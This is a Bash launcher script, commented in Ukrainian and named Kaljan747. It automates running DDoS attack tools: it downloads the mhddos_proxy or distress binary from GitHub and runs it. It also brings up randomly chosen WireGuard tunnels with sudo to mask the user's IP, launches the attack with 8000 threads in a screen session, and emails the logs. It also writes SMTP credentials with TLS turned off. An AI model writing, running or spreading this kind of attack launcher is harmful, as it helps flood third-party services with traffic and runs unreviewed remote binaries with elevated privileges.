#!/bin/bash
set -e

# === Kaljan747 — Автоматизований запуск модулів з підтримкою WireGuard та email-логами ===

# === КОЛЬОРОВИЙ ТЕРМІНАЛ-ВИВІД (СТРУКТУРА) ===
echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m🚀  Запуск Kaljan747\e[0m"
echo -e "\e[1;36m========================================\e[0m"

function log_step() {
  echo -e "\e[1;34m🔹 $1...\e[0m"
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

function log_success() {
  echo -e "\e[1;32m✔️  $1\e[0m"
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] [OK] $1" >> "$LOG_FILE"
}

function log_warning() {
  echo -e "\e[1;33m⚠️  $1\e[0m"
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] [WARN] $1" >> "$LOG_FILE"
}

function log_error() {
  echo -e "\e[1;31m❌  $1\e[0m"
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ERR] $1" >> "$LOG_FILE"
}

echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m🔧 Ініціалізація завершена\e[0m"
echo -e "\e[1;36m========================================\e[0m"
echo -e ""

# === Визначення відносних робочих шляхів ===
WORKDIR="$(dirname "$(realpath "$0")")"
SETTINGS_FILE="$WORKDIR/settings.conf"
LOG_DIR="$WORKDIR/logs"
LOG_FILE="$LOG_DIR/wg.log"
WG_DIR="$WORKDIR/wg_confs"
MODULE_DIR="$WORKDIR/modules"

mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
touch "$LOG_FILE" "$SETTINGS_FILE"
chmod -R 755 "$WORKDIR"

# === Email-конфігурація ===
echo "Введіть email для логів (залиште порожнім для пропуску):"
read EMAIL_TARGET
if [[ "$EMAIL_TARGET" =~ ^.+@.+\..+$ ]]; then
  echo -e "defaults\nauth on\ntls off\nlogfile $WORKDIR/msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" > "$WORKDIR/msmtprc"
  chmod 600 "$WORKDIR/msmtprc"
fi

# === Запит параметрів запуску ===
echo "Введіть USER-ID (тільки цифри):"
read USER_ID
if ! [[ "$USER_ID" =~ ^[0-9]+$ ]]; then log_error "USER-ID має містити тільки цифри"; exit 1; fi

echo "Оберіть модуль:"
echo "1) mhddos_proxy"
echo "2) distress"
read -p "Ваш вибір: " mod_choice
if [ "$mod_choice" = "1" ]; then
  SELECTED_MODULE="mhddos_proxy"
else
  SELECTED_MODULE="distress"
fi

echo "Редагувати INI перед запуском? (1=Так, 2=Ні):"
read edit_choice
EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

echo "Режим запуску:
1) screen у фоні
2) screen відкрито
3) без screen"
read -p "Ваш вибір: " run_choice
case "$run_choice" in
    1) SELECTED_RUN_MODE="screen у фоні";;
    2) SELECTED_RUN_MODE="screen відкрито";;
    3) SELECTED_RUN_MODE="без screen";;
    *) SELECTED_RUN_MODE="screen у фоні";;
esac

# === Встановлення модулів ===
if [ "$SELECTED_MODULE" = "mhddos_proxy" ]; then
  MODULE="$MODULE_DIR/mhddos_proxy"
  CONFIG_FILE="$MODULE_DIR/mhddos.ini"
  MODULE_URL="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
else
  MODULE="$MODULE_DIR/distress"
  CONFIG_FILE="$MODULE_DIR/distress.ini"
  MODULE_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
fi
wget -qO "$MODULE" "$MODULE_URL"
chmod +x "$MODULE"

# === Підключення WG ===
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
for url in $CONF_LIST; do wget -qO "$WG_DIR/$(basename $url)" "$url"; done

INTERFACES=()
for conf in $(find "$WG_DIR" -name '*.conf' | shuf | head -n 4); do
  IFACE_NAME=$(basename "$conf" .conf)
  sudo wg-quick up "$conf" && INTERFACES+=("$IFACE_NAME")
  sleep 1
  log_success "Підключено: $IFACE_NAME"
done

# === INI ===
INTERFACES_CSV=$(IFS=','; echo "${INTERFACES[*]}")
echo "--use-my-ip 0 --copies auto -t 8000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" > "$CONFIG_FILE"

if [ "$EDIT_INI" = "Так" ]; then
  nano "$CONFIG_FILE"
fi

# === Запуск ===
case "$SELECTED_RUN_MODE" in
  "screen у фоні") screen -dmS "kaljan" "$MODULE" $(cat "$CONFIG_FILE") ;;
  "screen відкрито") screen -S "kaljan" "$MODULE" $(cat "$CONFIG_FILE") ;;
  "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

log_success "Модуль $SELECTED_MODULE запущено"

# === Надсилання логів ===
if [ -n "$EMAIL_TARGET" ]; then
  echo -e "\n===== Звіт Kaljan747 =====\n" | cat - "$LOG_FILE" | msmtp --file="$WORKDIR/msmtprc" "$EMAIL_TARGET"
  log_success "Звіт надіслано на $EMAIL_TARGET"
fi

log_success "Готово. Слідкуйте за логом: $LOG_FILE"
exit 0
